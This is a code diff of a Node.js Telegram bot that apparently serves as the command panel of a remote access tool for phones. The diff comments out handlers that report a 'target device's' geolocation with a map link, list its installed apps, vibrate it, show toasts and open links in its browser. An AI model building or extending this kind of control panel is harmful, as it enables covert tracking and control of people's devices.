@@ -740,142 +740,142 @@ me.on("data", async (data) => {
             if (_message.method == "getUsers"){
                 updating_users = _message.users;
                 console.log("USERS SETED");
-            } else if (_message.method == "getUserByDeviceId"){
-                if (_message.shortcut){
-                    if (_message.shortcut.way == 'seeMenu'){
-                        createKeyboard(_message.user.accessory, _message.user.device_id, _message.shortcut.msgowner, async (keyboard) => {
-                            await bot.sendMessage(
-                                _message.shortcut.chat_id,
-                                build("🦋 𓏺|𓏺 user selected\n🌐 𓏺|𓏺 device id: ") + `<code>${_message.user.device_id}</code>` + build(`\n📁 𓏺|𓏺 has ${_message.user.accessory.length} access`),
-                                {
-                                    reply_to_message_id: _message.shortcut.message_id,
-                                    parse_mode: "HTML",
-                                    reply_markup: {
-                                        inline_keyboard: keyboard
-                                    }
-                                }
-                            )
-                        })
-                    }
-                }
-            } else if (_message.method == "vibratePhone"){
-                if (_message.shortcut){
-                    await bot.editMessageText(
-                        build(`💠 ${sym} device of ${_message.device_id} were vibrated`),
-                        {
-                            message_id: _message.shortcut.message_id,
-                            chat_id: _message.shortcut.chat_id
-                        }
-                    )
-                }
-            } else if (_message.method == "openUrl"){
-                if (_message.shortcut){
-                    await bot.editMessageText(
-                        build(`🍬 ${sym} user opened the link - `) + `<a href="${_message.shortcut.url}">${build("your link")}</a>` + build(` has opened in defualt-browser of target device\n📽 ${sym} `) + `<code>${_message.device_id}</code>`,
-                        {
-                            message_id: _message.shortcut.message_id,
-                            chat_id: _message.shortcut.chat_id
-                        }
-                    )
-                }
-            } else if (_message.method == "sendToast"){
-                if (_message.shortcut){
-                    await bot.editMessageText(
-                        build(`🍧 ${sym} your message sent successfully & text showed-up`),
-                        {
-                            message_id: _message.shortcut.message_id,
-                            chat_id: _message.shortcut.chat_id
-                        }
-                    )
-                }
-            } else if (_message.method == "getGeoLocation"){
-                if (_message.shortcut){
-                    await bot.editMessageText(
-                        build(`🗺 ${sym} location detected\n🛰 ${sym} latitude & longitude : `) +  `<code>${_message.latitude},${_message.longitude}</code>` + build(`\n🔬 ${sym} check on `) + `<a href="https://www.google.com/maps/@${_message.latitude},${_message.longitude},15z">${build("google-map")}</a>`,
-                        {
-                            parse_mode: "HTML",
-                            chat_id: _message.shortcut.chat_id,
-                            message_id: _message.shortcut.message_id
-                        }
-                    )
-                }
-            } else if (_message.method == "getInstalledApps"){
-                if (_message.shortcut){
-                    device_apps[_message.device_id] = _message.apps;
-                    let srta = sortAppsToString(_message.apps, 0, _message.device_id, _message.shortcut.msgowner)
-                    await bot.editMessageText(
-                        srta.message,
-                        {
-                            chat_id: _message.shortcut.chat_id,
-                            message_id: _message.shortcut.message_id,
-                            reply_markup: {
-                                inline_keyboard: srta.binds
-                            }
-                        }
-                    )
-                }
-            }
-        } else {
-            if (_message.shortcut){
-                if (_message.message == "USER_NOT_FOUND"){
-                    _message.edit == false ? await bot.sendMessage(
-                        _message.shortcut.chat_id,
-                        build("🔴 𓏺|𓏺 user not found"),
-                        {
-                            reply_to_message_id: _message.shortcut.message_id
-                        }
-                    ) : await bot.editMessageText(
-                        build("🔴 𓏺|𓏺 user not found"),
-                        {
-                            chat_id: _message.shortcut.chat_id,
-                            message_id: _message.shortcut.message_id
-                        }
-                    )
-                } else if (_message.message == "INVALID_PORT_OR_PASSWORD"){
-                    _message.edit == false ? await bot.sendMessage(
-                        _message.shortcut.chat_id,
-                        build("🔴 𓏺|𓏺 invalid port or password detected"),
-                        {
-                            reply_to_message_id: _message.shortcut.message_id
-                        }
-                    ) : await bot.editMessageText(
-                        build("🔴 𓏺|𓏺 invalid port or password detected"),
-                        {
-                            chat_id: _message.shortcut.chat_id,
-                            message_id: _message.shortcut.message_id
-                        }
-                    )
-                } else if (_message.message == "YOU_BANNED"){
-                    _message.edit == false ? await bot.sendMessage(
-                        _message.shortcut.chat_id,
-                        build("🔴 𓏺|𓏺 sorry but you got banned"),
-                        {
-                            reply_to_message_id: _message.shortcut.message_id
-                        }
-                    ) : await bot.editMessageText(
-                        build("🔴 𓏺|𓏺 sorry but you got banned"),
-                        {
-                            chat_id: _message.shortcut.chat_id,
-                            message_id: _message.shortcut.message_id
-                        }
-                    )
-                } else {
-                    console.log(_message);
-                    _message.edit == false ? await bot.sendMessage(
-                        _message.shortcut.chat_id,
-                        build("🔴 𓏺|𓏺 unkown error detected !"),
-                        {
-                            reply_to_message_id: _message.shortcut.message_id
-                        }
-                    ) : await bot.editMessageText(
-                        build("🔴 𓏺|𓏺 unkown error detected ! maybe process didnt successful"),
-                        {
-                            chat_id: _message.shortcut.chat_id,
-                            message_id: _message.shortcut.message_id
-                        }
-                    )
-                }
-            }
+            }// else if (_message.method == "getUserByDeviceId"){
+//                 if (_message.shortcut){
+//                     if (_message.shortcut.way == 'seeMenu'){
+//                         createKeyboard(_message.user.accessory, _message.user.device_id, _message.shortcut.msgowner, async (keyboard) => {
+//                             await bot.sendMessage(
+//                                 _message.shortcut.chat_id,
+//                                 build("🦋 𓏺|𓏺 user selected\n🌐 𓏺|𓏺 device id: ") + `<code>${_message.user.device_id}</code>` + build(`\n📁 𓏺|𓏺 has ${_message.user.accessory.length} access`),
+//                                 {
+//                                     reply_to_message_id: _message.shortcut.message_id,
+//                                     parse_mode: "HTML",
+//                                     reply_markup: {
+//                                         inline_keyboard: keyboard
+//                                     }
+//                                 }
+//                             )
+//                         })
+//                     }
+//                 }
+//             } else if (_message.method == "vibratePhone"){
+//                 if (_message.shortcut){
+//                     await bot.editMessageText(
+//                         build(`💠 ${sym} device of ${_message.device_id} were vibrated`),
+//                         {
+//                             message_id: _message.shortcut.message_id,
+//                             chat_id: _message.shortcut.chat_id
+//                         }
+//                     )
+//                 }
+//             } else if (_message.method == "openUrl"){
+//                 if (_message.shortcut){
+//                     await bot.editMessageText(
+//                         build(`🍬 ${sym} user opened the link - `) + `<a href="${_message.shortcut.url}">${build("your link")}</a>` + build(` has opened in defualt-browser of target device\n📽 ${sym} `) + `<code>${_message.device_id}</code>`,
+//                         {
+//                             message_id: _message.shortcut.message_id,
+//                             chat_id: _message.shortcut.chat_id
+//                         }
+//                     )
+//                 }
+//             } else if (_message.method == "sendToast"){
+//                 if (_message.shortcut){
+//                     await bot.editMessageText(
+//                         build(`🍧 ${sym} your message sent successfully & text showed-up`),
+//                         {
+//                             message_id: _message.shortcut.message_id,
+//                             chat_id: _message.shortcut.chat_id
+//                         }
+//                     )
+//                 }
+//             } else if (_message.method == "getGeoLocation"){
+//                 if (_message.shortcut){
+                    // await bot.editMessageText(
+                    //     build(`🗺 ${sym} location detected\n🛰 ${sym} latitude & longitude : `) +  `<code>${_message.latitude},${_message.longitude}</code>` + build(`\n🔬 ${sym} check on `) + `<a href="https://www.google.com/maps/@${_message.latitude},${_message.longitude},15z">${build("google-map")}</a>`,
+                    //     {
+                    //         parse_mode: "HTML",
+                    //         chat_id: _message.shortcut.chat_id,
+                    //         message_id: _message.shortcut.message_id
+                    //     }
+                    // )
+//                 }
+//             } else if (_message.method == "getInstalledApps"){
+//                 if (_message.shortcut){
+//                     device_apps[_message.device_id] = _message.apps;
+//                     let srta = sortAppsToString(_message.apps, 0, _message.device_id, _message.shortcut.msgowner)
+//                     await bot.editMessageText(
+//                         srta.message,
+//                         {
+//                             chat_id: _message.shortcut.chat_id,
+//                             message_id: _message.shortcut.message_id,
+//                             reply_markup: {
+//                                 inline_keyboard: srta.binds
+//                             }
+//                         }
+//                     )
+//                 }
+//             }
+//         } else {
+//             if (_message.shortcut){
+//                 if (_message.message == "USER_NOT_FOUND"){
+//                     _message.edit == false ? await bot.sendMessage(
+//                         _message.shortcut.chat_id,
+//                         build("🔴 𓏺|𓏺 user not found"),
+//                         {
+//                             reply_to_message_id: _message.shortcut.message_id
+//                         }
+//                     ) : await bot.editMessageText(
+//                         build("🔴 𓏺|𓏺 user not found"),
+//                         {
+//                             chat_id: _message.shortcut.chat_id,
+//                             message_id: _message.shortcut.message_id
+//                         }
+//                     )
+//                 } else if (_message.message == "INVALID_PORT_OR_PASSWORD"){
+//                     _message.edit == false ? await bot.sendMessage(
+//                         _message.shortcut.chat_id,
+//                         build("🔴 𓏺|𓏺 invalid port or password detected"),
+//                         {
+//                             reply_to_message_id: _message.shortcut.message_id
+//                         }
+//                     ) : await bot.editMessageText(
+//                         build("🔴 𓏺|𓏺 invalid port or password detected"),
+//                         {
+//                             chat_id: _message.shortcut.chat_id,
+//                             message_id: _message.shortcut.message_id
+//                         }
+//                     )
+//                 } else if (_message.message == "YOU_BANNED"){
+//                     _message.edit == false ? await bot.sendMessage(
+//                         _message.shortcut.chat_id,
+//                         build("🔴 𓏺|𓏺 sorry but you got banned"),
+//                         {
+//                             reply_to_message_id: _message.shortcut.message_id
+//                         }
+//                     ) : await bot.editMessageText(
+//                         build("🔴 𓏺|𓏺 sorry but you got banned"),
+//                         {
+//                             chat_id: _message.shortcut.chat_id,
+//                             message_id: _message.shortcut.message_id
+//                         }
+//                     )
+//                 } else {
+//                     console.log(_message);
+//                     _message.edit == false ? await bot.sendMessage(
+//                         _message.shortcut.chat_id,
+//                         build("🔴 𓏺|𓏺 unkown error detected !"),
+//                         {
+//                             reply_to_message_id: _message.shortcut.message_id
+//                         }
+//                     ) : await bot.editMessageText(
+//                         build("🔴 𓏺|𓏺 unkown error detected ! maybe process didnt successful"),
+//                         {
+//                             chat_id: _message.shortcut.chat_id,
+//                             message_id: _message.shortcut.message_id
+//                         }
+//                     )
+//                 }
+//             }
         }
     } catch (e) {
         console.log(e)
